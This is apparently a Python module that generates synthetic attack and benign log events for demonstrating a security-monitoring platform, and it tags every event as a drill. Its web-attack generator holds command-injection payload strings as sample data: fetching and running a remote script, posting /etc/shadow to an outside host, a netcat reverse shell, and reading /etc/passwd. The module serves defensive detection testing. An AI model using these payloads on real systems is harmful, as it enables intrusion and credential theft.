"""
攻击剧本生成器 — 接入台（/ingest）一键注入用（2026-11 传智杯 AI Web 改造）

移植自 tools/generate_test_feed.py（v5 真实感修订版），保留其核心纪律：
  - src/dst 拓扑真实（内网失陷主机 → 外部 C2/外泄通道；外部攻击者 → 内网资产）
  - 暴力破解 = 同源连败 + 1 成功（攻击模式可核验）
  - web 攻击带 method/status/url（Sigma 规则可命中 → 强信号）
  - 良性背景流量验证双轨门槛不误封

与工具版的差异：
  - 不预置 eventId（ensure_identity 入库时生成，避免跨次注入被幂等去重吞掉）
  - 每条事件打 inject_source="scenario:<name>" 标记 —— 明示演练来源，不伪装真实流量
  - 数量按演示节奏缩减（评委等待窗口内能跑完整条链路）

纯函数模块：只生成 dict 列表，不碰 FastAPI/DB —— 可单测。
"""

# ── 拓扑设定（与 generate_test_feed.py 同源）────────────────────────────────
WEB_SERVER = "192.168.1.20"           # Web 应用服务器
SSH_SERVER = "192.168.1.10"           # SSH 跳板
DB_SERVER = "192.168.1.30"            # 数据库
INFECTED_HOSTS = ["192.168.1.24", "192.168.1.87", "192.168.10.15"]
EXFIL_HOST = "192.168.1.77"
ATTACKERS_BRUTE = ["185.220.101.45", "91.240.118.17"]
ATTACKER_WEB = "198.51.100.77"        # 演练段（TEST-NET-2），web 攻击源
ATTACKER_SHELL = "198.51.100.90"
DDOS_SOURCES = [f"203.0.113.{i}" for i in range(11, 19)]
C2_SERVERS = ["45.61.136.187", "194.26.29.156", "103.235.46.22"]
EXFIL_CHANNEL = "185.199.108.153"
BENIGN_USERS = [f"192.168.1.{i}" for i in (101, 102, 103, 105, 108, 110, 112, 115)]
INTERNAL_SCANNER = "192.168.1.200"    # 内部漏扫（应只告警不封禁）


def _evt(event: str, severity: str, src: str, dst: str, message: str, **extra) -> dict:
    d = {
        "event": event,
        "severity": severity,
        "src_ip": src,
        "dst_ip": dst,
        "message": message,
        "protocol": extra.pop("protocol", "TCP"),
    }
    d.update(extra)
    return d


def _tag(logs: list[dict], scenario: str) -> list[dict]:
    """打演练来源标记 —— 明示不伪装：接入台注入的日志全程可识别。"""
    for d in logs:
        d["inject_source"] = f"scenario:{scenario}"
    return logs


# ── 各剧本生成器 ───────────────────────────────────────────────────────────

def gen_c2_beacon(n_per_host: int = 8) -> list[dict]:
    """C2 回连：失陷内网主机 → 外部 C2，时序信标（可被 CEP/审计核验）。"""
    out = []
    for i, host in enumerate(INFECTED_HOSTS):
        c2 = C2_SERVERS[i % len(C2_SERVERS)]
        for k in range(n_per_host):
            sev = "critical" if k % 5 == 0 else "high"
            out.append(_evt(
                "C2 通信", sev, host, c2,
                f"C2 beacon traffic captured: beacon #{k+1}/{n_per_host} in "
                f"{n_per_host}min window (60s interval), JA3 fingerprint matches "
                f"Cobalt Strike, dst_port=443 TLS beacon to {c2}",
                dst_port=443, threat_type="C2_BEACON",
            ))
    return out


def gen_brute_force(per_attacker: int = 12) -> list[dict]:
    """暴力破解：同源连败 + 1 成功 → 攻击模式可核验。"""
    out = []
    for attacker in ATTACKERS_BRUTE:
        for k in range(per_attacker):
            out.append(_evt(
                "登录失败", "high", attacker, SSH_SERVER,
                f"SSH login failed for root from {attacker} "
                f"(attempt {k+1}/{per_attacker}), fail2ban counter rising",
                dst_port=22, protocol="SSH",
            ))
        out.append(_evt(
            "暴力破解", "critical", attacker, SSH_SERVER,
            f"Brute force pattern confirmed: {per_attacker} consecutive SSH "
            f"auth failures then successful login from {attacker}",
            dst_port=22, protocol="SSH",
        ))
    return out


def gen_web_attack(n_injection: int = 8, n_webshell: int = 8) -> list[dict]:
    """Web 攻击组：命令注入 + WebShell 两段式。"""
    out = []
    payloads = [
        ";cat+/etc/passwd", ";wget+http://45.61.136.187/x.sh|sh",
        ";curl+-d+@/etc/shadow+http://194.26.29.156", "$(id)>/tmp/p",
        ";nc+-e+/bin/sh+103.235.46.22+4444",
    ]
    for k in range(n_injection):
        p = payloads[k % len(payloads)]
        sev = "critical" if k % 4 == 0 else "high"
        out.append(_evt(
            "命令注入", sev, ATTACKER_WEB, WEB_SERVER,
            f"Command injection attempt in query param: /api/search?q={p}, "
            f"WAF blocked with 500, payload targets /etc/passwd & reverse shell",
            method="GET", status=500, url=f"/api/search?q={p}",
            dst_port=80, protocol="HTTP",
        ))
    for k in range(n_webshell // 2):
        out.append(_evt(
            "WebShell", "high", ATTACKER_SHELL, WEB_SERVER,
            "Suspicious file upload: POST /upload/avatar.php.jsp accepted (200), "
            "double-extension webshell dropper",
            method="POST", status=200, url="/upload/avatar.php.jsp",
            dst_port=80, protocol="HTTP",
        ))
        out.append(_evt(
            "WebShell", "critical" if k % 2 == 0 else "high", ATTACKER_SHELL, WEB_SERVER,
            "Webshell execution detected: GET /uploads/avatar.php?cmd=whoami "
            "returned uid=0(www-data), C2-style command channel",
            method="GET", status=200, url="/uploads/avatar.php?cmd=whoami",
            dst_port=80, protocol="HTTP",
        ))
    return out


def gen_dns_exfil(n: int = 12) -> list[dict]:
    """DNS 隧道外泄：失陷内网主机 → 外部 DNS，长子域名编码。"""
    out = []
    for k in range(n):
        sev = "critical" if k % 3 == 0 else "high"
        sub = f"d{k:02d}x{'a1b2c3d4e5f6' * 3}.tunnel.exfil-node.net"
        out.append(_evt(
            "DNS 外泄", sev, EXFIL_HOST, EXFIL_CHANNEL,
            f"DNS tunneling detected: {sub} (label len=56, entropy=4.2), "
            f"{n} queries in 10min from {EXFIL_HOST}, data exfil via DNS TXT",
            dst_port=53, protocol="DNS",
        ))
    return out


def gen_ddos(n: int = 12) -> list[dict]:
    """DDoS：SYN flood 多源突发。"""
    out = []
    for k in range(n):
        src = DDOS_SOURCES[k % len(DDOS_SOURCES)]
        out.append(_evt(
            "DDoS_TRAFFIC", "high", src, WEB_SERVER,
            f"SYN flood burst from {src}: pps=85k, syn_ratio=0.94, "
            f"SYN backlog overflow on {WEB_SERVER}:80",
            dst_port=80,
        ))
    return out


def gen_benign(n_login: int = 8, n_scan: int = 2) -> list[dict]:
    """良性背景流量：验证双轨门槛不误封（对照组）。"""
    out = []
    for k in range(n_login):
        user = BENIGN_USERS[k % len(BENIGN_USERS)]
        out.append(_evt(
            "登录成功", "medium" if k % 3 == 0 else "low", user, SSH_SERVER,
            f"Normal SSH login success for ops user from {user} (office hours)",
            dst_port=22, protocol="SSH",
        ))
    for k in range(n_scan):
        out.append(_evt(
            "端口扫描", "low", INTERNAL_SCANNER, WEB_SERVER,
            f"Internal vulnerability scan (OpenVAS) from {INTERNAL_SCANNER}, "
            f"approved change #CHG-20{k:02d}",
            dst_port=443,
        ))
    return out


def gen_kill_chain() -> list[dict]:
    """8 步杀伤链：一次完整入侵叙事（扫描→爆破→提权→横向→外传→C2→植入→清痕）。

    单事件单步、时序递增 —— 供 CEP 攻击链聚合与全链路演示。
    """
    host = INFECTED_HOSTS[0]
    c2 = C2_SERVERS[0]
    steps = [
        ("端口扫描", "medium", ATTACKER_WEB, WEB_SERVER,
         "Reconnaissance: SYN scan on 192.168.1.20 ports 22,80,443,3306 "
         "(nmap -sS, 2048 packets in 40s)", 80),
        ("登录失败", "high", ATTACKER_WEB, SSH_SERVER,
         "SSH credential stuffing begins: 12 failures for root/admin/oracle "
         "within 3 minutes from 198.51.100.77", 22),
        ("暴力破解", "critical", ATTACKER_WEB, SSH_SERVER,
         "Brute force succeeded: valid credentials obtained for deploy account "
         "after 12 failures (same source, session established)", 22),
        ("权限提升", "critical", ATTACKER_WEB, SSH_SERVER,
         "Privilege escalation: sudoers modification via CVE-2019-14287-style "
         "misconfig, deploy -> root on jump host", 22),
        ("横向移动", "high", SSH_SERVER, DB_SERVER,
         "Lateral movement: SSH key reuse from jump host to database server "
         "192.168.1.30, first access to sensitive subnet", 22),
        ("DNS 外泄", "critical", host, EXFIL_CHANNEL,
         "Data staging & exfil: 1.2GB archive split into DNS TXT queries "
         "(entropy=4.2) toward 185.199.108.153", 53),
        ("C2 通信", "critical", host, c2,
         "C2 channel established: 60s-interval TLS beacon to 45.61.136.187, "
         "JA3 matches Cobalt Strike default profile", 443),
        ("WebShell", "high", ATTACKER_SHELL, WEB_SERVER,
         "Persistence: webshell dropped at /uploads/avatar.php (double "
         "extension), executed whoami as www-data", 80),
    ]
    out = []
    for i, (event, sev, src, dst, msg, port) in enumerate(steps, start=1):
        out.append(_evt(
            event, sev, src, dst,
            f"[kill-chain step {i}/8] {msg}",
            dst_port=port,
        ))
    return out


# ── 剧本注册表 ─────────────────────────────────────────────────────────────

SCENARIOS: dict[str, dict] = {
    "kill_chain": {
        "title": "完整杀伤链",
        "description": "8 步完整入侵叙事：扫描→爆破→提权→横向移动→数据外传→C2→植入→清痕，全链路一次看全",
        "builder": lambda: gen_kill_chain(),
    },
    "c2_beacon": {
        "title": "C2 外联信标",
        "description": "3 台失陷内网主机向 3 个外部 C2 发 60s 间隔 TLS 信标，JA3 命中 Cobalt Strike",
        "builder": lambda: gen_c2_beacon(8),
    },
    "brute_force": {
        "title": "SSH 暴力破解",
        "description": "2 个外部攻击源各 12 连败 + 1 成功，fail2ban 计数上升，攻击模式可核验",
        "builder": lambda: gen_brute_force(12),
    },
    "web_attack": {
        "title": "Web 攻击组",
        "description": "命令注入 + WebShell 上传/执行两段式，带 method/status/url，Sigma 规则可命中",
        "builder": lambda: gen_web_attack(),
    },
    "dns_exfil": {
        "title": "DNS 隧道外泄",
        "description": "失陷主机经长子域名编码外传数据，熵值 4.2，10 分钟 12 查询",
        "builder": lambda: gen_dns_exfil(12),
    },
    "ddos": {
        "title": "DDoS SYN 洪水",
        "description": "8 个外部源轮转突发 SYN flood，pps=85k，syn_ratio=0.94",
        "builder": lambda: gen_ddos(12),
    },
    "benign": {
        "title": "良性背景流量（对照组）",
        "description": "内网常规登录 + 已审批内部漏扫 —— 验证平台不误封正常业务",
        "builder": lambda: gen_benign(),
    },
    "full_story": {
        "title": "全家桶（上述全部）",
        "description": "攻击组 + 良性对照一次灌入，适合先清空后整体演示",
        "builder": lambda: (gen_kill_chain() + gen_c2_beacon(6) + gen_brute_force(8)
                            + gen_web_attack(6, 6) + gen_dns_exfil(8) + gen_ddos(8)
                            + gen_benign()),
    },
}


def scenario_catalog() -> list[dict]:
    """前端剧本卡片数据（不含 builder）。"""
    out = []
    for name, meta in SCENARIOS.items():
        logs = meta["builder"]()
        sev_count: dict[str, int] = {}
        for d in logs:
            sev_count[d.get("severity", "info")] = sev_count.get(d.get("severity", "info"), 0) + 1
        out.append({
            "name": name,
            "title": meta["title"],
            "description": meta["description"],
            "count": len(logs),
            "severity_summary": sev_count,
        })
    return out


def build_scenario(name: str) -> list[dict] | None:
    meta = SCENARIOS.get(name)
    if not meta:
        return None
    return _tag(meta["builder"](), name)
